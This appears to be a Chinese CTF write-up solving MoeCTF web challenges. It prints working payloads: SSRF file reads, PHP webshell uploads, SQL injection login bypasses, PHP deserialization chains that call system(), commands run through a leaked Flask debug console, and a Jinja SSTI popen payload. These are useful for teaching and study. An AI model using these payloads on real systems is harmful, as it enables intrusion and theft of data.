<p>分析题目部分源码，还以为是include文件包含读取<code>/etc/passwd</code></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>curl_exec</code>函数不能直接访问本地文件，用一个<code>file://</code>协议读<code>/etc/passwd</code></p> <p><img src="/medias/moectf/12.png" alt="12"></p> <h2 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="header-anchor">#</a> 垫刀之路02: 普通的文件上传</h2> <p>没有过滤，上传php木马，查看环境变量</p> <p><img src="/medias/moectf/13.png" alt="13"></p> <h2 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="header-anchor">#</a> 垫刀之路03: 这是一个图床</h2> <p>php木马扩展名改成图片类型上传，bp抓包改回php。对了抓包可能要用bp自带的浏览器，不然可能抓不到本地的请求</p> <p><img src="/medias/moectf/14.png" alt="14"></p> <h2 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="header-anchor">#</a> 垫刀之路05: 登陆网站</h2> <p>万能密码<code>username=admin123'or 1='1&amp;password=1</code>，存在sql注入漏洞</p> <p>sql语句没有过滤，直接拼接<code>'or 1=1#</code>登录就可以</p> <p><img src="/medias/moectf/15.png" alt="15"></p> <h2 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="header-anchor">#</a> 垫刀之路06: pop base mini moe</h2> <p>在B类的<code>__invoke()</code>方法里，存在动态函数调用<code>$s($c);</code></p> <p>本地调试一下，可以执行命令</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'time'</span><span class="token punctuation">;</span>
<span class="token comment"># The current time is:  0:56:34.09</span>
<span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>把属性改成public生成payload，手动修改private属性的修饰符<code>%00</code>，以及private属性的长度</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">evil</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;cat /flag&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">-&gt;</span> <span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;system&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># ?data=O:1:%22A%22:2:{s:7:%22%00A%00evil%22;s:3:%22env%22;s:4:%22%00A%00a%22;O:1:%22B%22:1:{s:4:%22%00B%00b%22;s:6:%22system%22;}}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p><img src="/medias/moectf/16.png" alt="16"></p> <h2 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="header-anchor">#</a> 垫刀之路07: 泄漏的密码</h2> <p>第一次遇到白给的flask pin码，爱了爱了。拿pin码到<code>/console</code>路由的控制台直接拿python shell</p> <details class="custom-block details"><summary>点击查看</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span>console ready<span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> os
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'远在天边，近在眼前啊'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'KUBERNETES_SERVICE_PORT=443\nKUBERNETES_PORT=tcp://10.43.0.1:443\nHOSTNAME=ret2shell-119-11100\nPYTHON_PIP_VERSION=23.0.1\nSHLVL=2\nHOME=/root\nGPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D\nWERKZEUG_SERVER_FD=4\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py\nWERKZEUG_RUN_MAIN=true\nKUBERNETES_PORT_443_TCP_ADDR=10.43.0.1\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nKUBERNETES_PORT_443_TCP_PORT=443\nKUBERNETES_PORT_443_TCP_PROTO=tcp\nLANG=C.UTF-8\nPYTHON_VERSION=3.10.14\nPYTHON_SETUPTOOLS_VERSION=65.5.1\nKUBERNETES_SERVICE_PORT_HTTPS=443\nKUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443\nKUBERNETES_SERVICE_HOST=10.43.0.1\nPWD=/app\nPYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118\nFLAG=fake_flag\n'</span>  
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token string">'app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'</span>  
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token string">'__pycache__\napp.py\nflag\ngetPIN.py\nstatic\ntemplates\n'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat *'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token string">'import os\n\nfrom flask import Flask, render_template, request, session\nfrom getPIN import get_pin\n\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\npin = get_pin()\n\n\n\n@app.route(\'/\')\ndef index():\n    return render_template(\'index.html\', pin=pin)\n\n\nif __name__ == &quot;__main__&quot;:\n    app.run(debug=True, host=\'0.0.0.0\', port=80)\n    # print(get_pin())\nmoectf{DonT-UslNG-fI4Sk-bY-d3buG_MoD_And_le@K_Y0Ur_PiN11}import hashlib\nfrom itertools import chain\nimport uuid\ndef get_pin():\n    probably_public_bits = [\n        # \'ctf\'# username  /proc/self/environ\n        \'root\',\n        \'flask.app\',# modname\n        \'Flask\',# getattr(app, \'__name__\', getattr(app.__class__, \'__name__\'))\n        # \'/usr/local/lib/python3.9/site-packages/flask/app.py\' # getattr(mod, \'__file__\', None),\n        \'/usr/local/lib/python3.10/site-packages/flask/app.py\' # getattr(mod, \'__file__\', None),\n    ]\n    uuid1 = str(uuid.getnode())\n    linux = b&quot;&quot;\n\n    # machine-id is stable across boots, boot_id is not.\n    for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:\n        try:\n            with open(filename, &quot;rb&quot;) as f:\n                value = f.readline().strip()\n        except OSError:\n            continue\n\n        if value:\n            linux += value\n            break\n\n    # Containers share the same machine id, add some cgroup\n    # information. This is used outside containers too but should be\n    # relatively stable across boots.\n    try:\n        with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:\n            linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]\n    except OSError:\n        pass\n    linux = linux.decode(\'utf-8\')\n    private_bits = [\n        uuid1,\n        linux,\n    ]\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(&quot;utf-8&quot;)\n        h.update(bit)\n    h.update(b&quot;cookiesalt&quot;)\n\n    cookie_name = f&quot;__wzd{h.hexdigest()[:20]}&quot;\n\n    num = None\n    if num is None:\n        h.update(b&quot;pinsalt&quot;)\n        num = f&quot;{int(h.hexdigest(), 16):09d}&quot;[:9]\n\n    rv=None\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = &quot;-&quot;.join(\n                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv\n'</span>  
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div></details> <h2 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="header-anchor">#</a> 垫刀之路04: 一个文件浏览器</h2> <p>这题太有意思了。在首页的readme和src目录下的readme文件提示这些文件夹没有用，另外一个txt文件没有flag，那么明显flag不在我们现在看到的首页文件夹里。这题考察了一个目录穿越问题，不允许你直接访问<code>/</code>根目录，访问根目录就是访问当前目录，所以需要通过目录穿越来访问根目录</p> <p>最后可以在<code>/tmp/flag</code>找到flag</p> <p><img src="/medias/moectf/17.png" alt="17"></p> <h2 id="静态网页"><a href="#静态网页" class="header-anchor">#</a> 静态网页</h2> <p>bp自带浏览器抓包，查看每一个数据包时，在<code>/api/get/?id=1-53</code>里拿到了flag:php文件，进入php文件</p> <p><img src="/medias/moectf/18.png" alt="18"></p> <p><img src="/medias/moectf/19.png" alt="19"></p> <p>md5的结果是字符串，post传参也是字符串，把<code>$a</code>的值作为<code>$b</code>的索引，把<code>$a</code>的md5值给<code>$b</code>就可以满足条件了。这一题很巧妙，通过精心构造，可以拿到payload</p> <p><code>?a=0a</code></p> <p><code>b[0a]=e99bb33727d338314912e86fbdec87af</code></p> <p><img src="/medias/moectf/20.png" alt="20"></p> <p>这道题加深了数组的理解，太强了！</p> <h2 id="电院-backend"><a href="#电院-backend" class="header-anchor">#</a> 电院_backend</h2> <p>在<code>robots.txt</code>里有敏感目录<code>/admin/</code>路由，访问是一个登录页面。看题目附件源码和题目js，<code>verify.php</code>页面会生成一个验证码，js会提交<code>email,password,verify_code</code>这样数据到<code>/admin/login.php</code></p> <p>通过审计源码，可以发现存在sql注入漏洞。这个正则会尝试检查<code>email</code>变量里是否含有一个邮箱的格式，或者是否存在<code>or</code></p> <p>这个正则有点漏洞，只要<code>email</code>变量里可以匹配到邮箱格式，不含有or，那么这个正则就绕过去了</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/or/i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'不存在邮箱为： '</span><span class="token operator">.</span><span class="token variable">$email</span><span class="token operator">.</span><span class="token string single-quoted-string">' 的管理员账号！'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'captcha_code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>在后一部分中有flag的处理逻辑，只要查询结果不为0，就会爆flag。管理员邮箱我们不知道，那就使用联合查询，查点其他内容</p> <p><code>email=admin@qq.com'union select *from admin#&amp;password=11&amp;verify_code=d2a4</code></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'登陆成功，moectf{testflag}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/medias/moectf/21.png" alt="21"></p> <h2 id="pop-moe"><a href="#pop-moe" class="header-anchor">#</a> pop moe</h2> <p>简单的链子，思路</p> <p>通过反序列化后自动触发的方法<code>class000:__destruct</code>作为开始，<code>__destruct</code>调用check方法，把属性<code>$this-what</code>赋值给$a，作为函数名调用了，可以把<code>$this-what</code>赋值为<code>class001</code>的对象，把对象当函数调用触发<code>class001:__invoke</code>方法</p> <p>在<code>invoke</code>方法里，把<code>$this-&gt;payl10ad</code>赋值给<code>$this-&gt;a-&gt;payload</code>，如果<code>$this-&gt;a</code>是一个<code>class002</code>的对象，就会因为不存在<code>$payload</code>属性触发<code>class002:__get</code>方法</p> <p>参数<code>$this-&gt;a-&gt;payload</code>，<code>$this-&gt;pay10ad</code>传给set方法，这样<code>class002</code>类会添加这个属性，如果这个属性值是<code>dangerous</code>，下面动态调用函数<code>$this-&gt;$b($this-&gt;sec);</code></p> <p>把<code>$this-&gt;sec</code>赋值为<code>class003</code>类的对象，既可以因为<code>dangerous</code>方法把他当字符串，触发<code>__tostring</code>方法，<code>$this-&gt;mystr</code>作为字符串返回，也可以为后面触发evvval方法做铺垫，执行<code>$this-&gt;mystr</code>的值</p> <p>先改public打出payload，再手动添加权限修饰符</p> <p>exp</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">pay10ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">what</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">what</span> <span class="token operator">-&gt;</span> <span class="token property">payl0ad</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;dangerous&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">what</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">what</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">-&gt;</span> <span class="token property">sec</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">-&gt;</span> <span class="token property">what</span> <span class="token operator">-&gt;</span> <span class="token property">a</span> <span class="token operator">-&gt;</span> <span class="token property">sec</span> <span class="token operator">-&gt;</span> <span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;system('env');&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># O:8:&quot;class000&quot;:3:{s:17:&quot;%00class000%00payl0ad&quot;;i:1;s:7:&quot;%00*%00what&quot;;O:8:&quot;class001&quot;:2:{s:7:&quot;payl0ad&quot;;s:9:&quot;dangerous&quot;;s:1:&quot;a&quot;;O:8:&quot;class002&quot;:1:{s:13:&quot;%00class002%00sec&quot;;O:8:&quot;class003&quot;:1:{s:5:&quot;mystr&quot;;s:14:&quot;system('env');&quot;;}}}s:7:&quot;pay10ad&quot;;i:1;}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="header-anchor">#</a> 勇闯铜人阵</h2> <p>看题目的图片，数字对应的方向，写一个python脚本，用正则匹配给出的数字，构造payload，提交</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:51723/&quot;</span>

data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;player&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;direct&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;弟子明白&quot;</span>
<span class="token punctuation">}</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
direct_dict <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;1&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;北方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;2&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;东北方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;3&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;东方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;4&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;东南方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;5&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;南方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;6&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;西南方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;7&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;西方&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;8&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;西北方&quot;</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 使用正则表达式匹配&lt;h1&gt;标签中的数字</span>
    pattern <span class="token operator">=</span> <span class="token string">r'&lt;h1 id=&quot;status&quot;&gt;\s*(\d)(?:,\s*(\d+))?\s*&lt;/h1&gt;'</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> matches<span class="token punctuation">:</span>
        num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
       payload <span class="token operator">=</span> direct_dict<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">]</span>
       <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> direct_dict<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot;一个，&quot;</span> <span class="token operator">+</span> direct_dict<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>num<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot;一个&quot;</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;player&quot;</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span>
    <span class="token string">&quot;direct&quot;</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    resp <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p><img src="/medias/moectf/22.png" alt="22"></p> <h2 id="who-s-blog"><a href="#who-s-blog" class="header-anchor">#</a> who's blog?</h2> <p>在首页通过get传参id，可以发现存在ssti模板注入，好像没有过滤，一路直接打过去了</p> <div><p><code>?id={{''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('env').read()}}</code></p></div><p><img src="/medias/moectf/23.png" alt="23"></p> <h2 id="imagecloud"><a href="#imagecloud" class="header-anchor">#</a> ImageCloud</h2> <p>这个题太有意思了，第一次这样审计python源码</p> 